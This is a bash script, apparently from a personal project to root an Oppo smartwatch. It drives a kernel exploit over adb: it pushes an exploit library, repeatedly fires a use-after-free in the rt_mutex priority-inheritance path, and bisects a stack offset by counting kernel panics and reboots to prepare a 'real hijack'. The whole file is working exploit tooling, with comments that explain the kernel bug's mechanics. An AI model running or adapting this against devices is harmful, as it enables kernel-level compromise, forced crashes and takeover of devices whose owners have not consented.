#!/usr/bin/env bash
# NON-DESTRUCTIVE W_BASE binary search via the rt_mutex_adjust_pi() prio bail-out.
#
#   rt_mutex_adjust_pi(task) does, before dereferencing ANYTHING inside the
#   waiter:
#       waiter = task->pi_blocked_on;
#       if (!waiter || rt_mutex_waiter_equal(waiter, task_to_waiter(task)))
#               return;                       <- compares ONLY waiter->prio
#   For a SCHED_NORMAL task prio = 120+nice (>= MAX_RT_PRIO), so ->deadline is
#   never touched either.  Therefore: if the reclaimed stack slot that holds
#   waiter->prio (global fdset word base+8) contains exactly the prio the
#   consumer burst sets, the whole PI walk stops there -- no deref, no rb_erase,
#   no write, and the fire returns cleanly.  Any other content makes the walk
#   deref waiter->lock (0 in every word we do not fill) -> NULL fault -> oops ->
#   Qualcomm watchdog bark -> reboot.
#
#   So each fire answers one clean bit: "is the true base inside the range whose
#   prio words we filled?"  Five fires localise it out of the 22 legal bases,
#   and -- unlike the optmem oracle -- a wrong answer costs nothing but a reboot
#   and no kernel global is ever modified.
#
# Usage: bash prio_bisect.sh [BASE_LO] [BASE_HI]     (defaults 0 21)
export MSYS_NO_PATHCONV=1
ADB=/c/platform-tools/adb.exe
DT=/data/local/tmp
ARCH=/c/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/captures
mkdir -p "$ARCH"
EXPECT_MD5=${EXPECT_MD5:-680a33f3cfcd49f2c7940054fae4f4fe}
SO_WIN=C:/Users/RLG/Documents/oppowatch2-root/GhostLock-OWW212/exploit/preload.so
LO0=${1:-0}
HI0=${2:-21}
OUT=/dev/stdout

online() { $ADB devices 2>/dev/null | grep -q 'device$'; }
waitdev() { local m=${1:-240} w=0; while ! online; do sleep 3; w=$((w+3)); [ $w -ge $m ] && return 1; done; sleep 3; return 0; }
ensure_so() {
  local dm
  dm=$($ADB shell "md5sum $DT/preload.so" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
  if [ "$dm" != "$EXPECT_MD5" ]; then
    echo "[prio] device .so md5=$dm != $EXPECT_MD5 -> re-push"
    MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" $ADB push "$SO_WIN" $DT/preload.so >/dev/null 2>&1
    $ADB shell sync
    dm=$($ADB shell "md5sum $DT/preload.so" 2>/dev/null | tr -d '\r' | cut -d' ' -f1)
    echo "[prio] after push md5=$dm"
    [ "$dm" = "$EXPECT_MD5" ] || { echo "[prio] .so PUSH FAILED"; return 1; }
  fi
  return 0
}

# fire LO HI -> prints CLEAN | PANIC | NOREACH | STAGEFAIL
fire() {
  local lo=$1 hi=$2 tag="${1}_${2}"
  waitdev 240 || { echo "NOREACH"; return; }
  ensure_so || { echo "NOREACH"; return; }
  $ADB shell "rm -f $DT/log_*.txt; sync" 2>/dev/null
  echo "[prio] fire range [$lo,$hi] $(date +%H:%M:%S)"
  timeout 180 $ADB shell "GHOSTLOCK_PRIO_LO=$lo GHOSTLOCK_PRIO_HI=$hi GHOSTLOCK_ATTEMPTS=1 sh $DT/fire.sh" >/dev/null 2>&1
  local rc=$?
  if ! waitdev 240; then echo "PANIC"; return; fi
  $ADB shell "cat $DT/log_*.txt 2>/dev/null" 2>/dev/null | tr -d '\r' > "$ARCH/prio_$tag.log"
  local L="$ARCH/prio_$tag.log"
  if grep -q 'PROBE-CLEAN' "$L"; then echo CLEAN; return; fi
  if grep -q 'PROBE-ARM' "$L"; then
    echo "PANIC"           # armed and then died mid-burst => prio word outside
    return
  fi
  echo "STAGEFAIL(rc=$rc)" # never reached pselect (leak/spray failed)
}

verdict() { # retry a STAGEFAIL once, then return the verdict
  local v
  v=$(fire "$1" "$2")
  [ "$v" = STAGEFAIL ] && { echo "[prio] [$1,$2] stage failure, retrying" >&2; v=$(fire "$1" "$2"); }
  echo "$v"
}

echo "=== PRIO-BISECT  bases $LO0..$HI0  $(date +%H:%M:%S) ==="

# 1) CONTROL: fill nothing with the prio.  MUST panic, otherwise the PI walk is
#    not being driven at all and this whole probe channel is meaningless.
V=$(verdict -1 -2)
echo "[prio] CONTROL(empty range) -> $V"
if [ "$V" = CLEAN ]; then
  echo "!!! empty-range probe returned clean: the sched_setattr walk is NOT reaching"
  echo "!!! task->pi_blocked_on (or pselect never blocked).  Probe invalid -- abort."
  exit 2
fi
[ "$V" = PANIC ] || { echo "!!! control fire inconclusive ($V) -- abort"; exit 3; }

# 2) FULL RANGE: if the stale waiter's prio word is inside the fillable fdset
#    (words 0..29 == the in/out/ex copies) this returns clean.
V=$(verdict "$LO0" "$HI0")
echo "[prio] FULL range [$LO0,$HI0] -> $V"
if [ "$V" != CLEAN ]; then
  echo "!!! full-range probe still panicked => the reclaimed waiter's prio word is"
  echo "!!! NOT placeable inside the pselect fdset copy (base>21 or a different frame)."
  exit 4
fi

# 3) bisect
lo=$LO0; hi=$HI0
while [ $lo -lt $hi ]; do
  mid=$(( (lo + hi) / 2 ))
  V=$(verdict $lo $mid)
  echo "[prio] [$lo,$mid] -> $V        (candidate window now $lo..$hi)"
  if [ "$V" = CLEAN ]; then
    hi=$mid
  elif [ "$V" = PANIC ]; then
    lo=$(( mid + 1 ))
  else
    echo "!!! inconclusive ($V); stopping with window $lo..$hi"
    break
  fi
done

echo ">>> W_BASE = $lo  (prio word = global fdset word $((lo + 8)))"
V=$(verdict $lo $lo)
echo "[prio] SINGLE base $lo -> $V"
[ "$V" = CLEAN ] && echo ">>> CONFIRMED W_BASE=$lo -- run the real hijack with GHOSTLOCK_WBASE=$lo"
echo "=== ended $(date +%H:%M:%S) ==="
